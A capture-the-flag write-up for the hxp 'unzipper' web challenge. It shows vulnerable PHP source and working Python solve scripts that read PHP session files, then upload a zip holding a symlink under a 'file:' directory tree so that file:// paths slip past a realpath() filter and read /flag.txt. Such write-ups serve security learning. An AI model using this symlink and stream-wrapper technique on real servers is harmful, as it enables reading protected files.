# unzipper

**Category**: web \
**Difficulty**: medium \
**Points**: 172 points (49 solves) \
**Author**: hlt

Here, let me unzip that for you.

Download: [unzipper.tar.xz](unzipper.tar.xz)

Connection: http://65.108.176.76:8200/

## Overview

Another small challenge:

```php
<?php
session_start() or die('session_start');

$_SESSION['sandbox'] ??= bin2hex(random_bytes(16));
$sandbox = 'data/' . $_SESSION['sandbox'];
$lock = fopen($sandbox . '.lock', 'w') or die('fopen');
flock($lock, LOCK_EX | LOCK_NB) or die('flock');

@mkdir($sandbox, 0700);
chdir($sandbox) or die('chdir');

if (isset($_FILES['file']))
    system('ulimit -v 8192 && /usr/bin/timeout -s KILL 2 /usr/bin/unzip -nqqd . ' . escapeshellarg($_FILES['file']['tmp_name']));
else if (isset($_GET['file']))
    if (0 === preg_match('/(^$|flag)/i', realpath($_GET['file']) ?: ''))
        readfile($_GET['file']);

fclose($lock);
```

- We can upload a zip, and the server will unzip it for us in a randomly-named
  sandbox directory. They use these `unzip` parameters:
  - `-n`: Do not overwrite existing files when unzipping
  - `-qq`: Quiet output

- We have arbitrary file read: http://65.108.176.76:8200/?file=/etc/passwd
  - However, `realpath()` returns the absolute pathname, resolving relative
    directories and symlinks.
  - The return value of `realpath()` can't contain `flag`, so simply reading
    `/flag.txt` is not possible.

- The lock file is to prevent race conditions with script running in the
  background that periodically deletes uploaded files

## Solution

> Solved with Youssef

First notice that we can use the `PHPSESSID` cookie and read our `$_SESSION` data from `/var/lib/php/sessions/`. This allows us to get `$sandbox`:

```python
import requests
import os

url = "http://65.108.176.76:8200"

s = requests.Session()
res = s.get(url)
sess_id = s.cookies["PHPSESSID"]
print(f"[+] PHPSESSID = {sess_id}")

res = s.get(f"{url}/?file=/var/lib/php/sessions/sess_{sess_id}")
sandbox = res.text.split(":")[-1].split(";")[0][1:-1]
print(f"[+] sandbox = {sandbox}")
```

```
[+] PHPSESSID = t7fl8v188kg8gd0ai3c3be0qq1
[+] sandbox = 29eca32e80f80d0230f27ddcb3a90377
```

Next I tried uploading a symlink to `/flag.txt` inside a zip and reading the symlink using `http://65.108.176.76:8200/?file=/var/www/html/data/{sandbox}/{symlink}`, but that didn't work because `realpath()` simply resolved the path to `/flag.txt`, which failed the check:

```php
    if (0 === preg_match('/(^$|flag)/i', realpath($_GET['file']) ?: ''))
        readfile($_GET['file']);
```

At this point Youssef had to idea of using `file://`.

What if we created a zip file with this directory structure?
```
$ ls --tree file: leak.lnk
file:
└── var
   └── www
      └── html
         └── data
            └── ccf86389404367cb06bab3ba41c71c27
               └── leak.lnk (symlink to /flag.txt)
leak.lnk -> /flag.txt
```

```
root@229a6d68a68b:/var/www/html/data/ccf86389404367cb06bab3ba41c71c27# psysh
Psy Shell v0.11.0 (PHP 7.4.25 _ cli) by Justin Hileman
>>> realpath('file:///var/www/html/data/ccf86389404367cb06bab3ba41c71c27/leak.lnk');
=> "/var/www/html/data/ccf86389404367cb06bab3ba41c71c27/file:/var/www/html/data/ccf86389404367cb06bab3ba41c71c27/leak.lnk"
>>> readfile('file:///var/www/html/data/ccf86389404367cb06bab3ba41c71c27/leak.lnk');
hxp{fleg}
=> 10
```

Notice that `realpath()` does the following translation
```
file:///var/www/html/data/ccf86389404367cb06bab3ba41c71c27/leak.lnk
file:/var/www/html/data/ccf86389404367cb06bab3ba41c71c27/leak.lnk
```
which it interprets as a relative file path. Notice that this `leak.lnk` is not a symlink to `/flag.txt`, but actually just an empty directory.

The actual symlink to `/flag.txt` is located in `/var/www/html/data/ccf86389404367cb06bab3ba41c71c27/leak.lnk`, which `readfile()` will read.

Props to Youssef for coming up with this solution!

```python
import requests
import os

url = "http://65.108.176.76:8200"

s = requests.Session()
res = s.get(url)
sess_id = s.cookies["PHPSESSID"]
print(f"[+] PHPSESSID = {sess_id}")

res = s.get(f"{url}/?file=/var/lib/php/sessions/sess_{sess_id}")
sandbox = res.text.split(":")[-1].split(";")[0][1:-1]
print(f"[+] sandbox = {sandbox}")

symlink = "leak.lnk"
file_url = f"file:///var/www/html/data/{sandbox}/{symlink}"

os.system("rm -rf leak.lnk go.zip file:")
os.system(f"ln -s /flag.txt leak.lnk")
os.system(f"mkdir -p {file_url}")
os.system(f"zip --symlinks -r go.zip file: {symlink}")

files = {"file": open("go.zip", "rb")}
res = s.post(f"{url}", files=files)
res = s.get(f"{url}/?file={file_url}")
print(res.text)
```

```
$ python3 solve.py
[+] PHPSESSID = 10a5nlegdvdl0o99a6e5khkedm
[+] sandbox = a8a188a8460b7a11b7bbad7f2a8562c6
  adding: file:/ (stored 0%)
  adding: file:/var/ (stored 0%)
  adding: file:/var/www/ (stored 0%)
  adding: file:/var/www/html/ (stored 0%)
  adding: file:/var/www/html/data/ (stored 0%)
  adding: file:/var/www/html/data/a8a188a8460b7a11b7bbad7f2a8562c6/ (stored 0%)
  adding: file:/var/www/html/data/a8a188a8460b7a11b7bbad7f2a8562c6/leak.lnk/ (stored 0%)
  adding: leak.lnk (stored 0%)
hxp{at_least_we_have_all_the_performance_in_the_world..._lolphp_:/}
```

## Note

The challenge set `php_admin_value[allow_url_fopen] = 0`. However, this still
lets use use PHP's various [stream
wrappers](https://www.php.net/manual/en/wrappers.php). Notice `file://` is not
restricted by `allow_url_fopen`, as indicated here:
https://www.php.net/manual/en/wrappers.file.php

You can also see this in the [source code](https://github.com/php/php-src/blob/PHP-7.4.25/main/streams/streams.c#L1865), where `plain_files_wrapper->is_url == 0`.
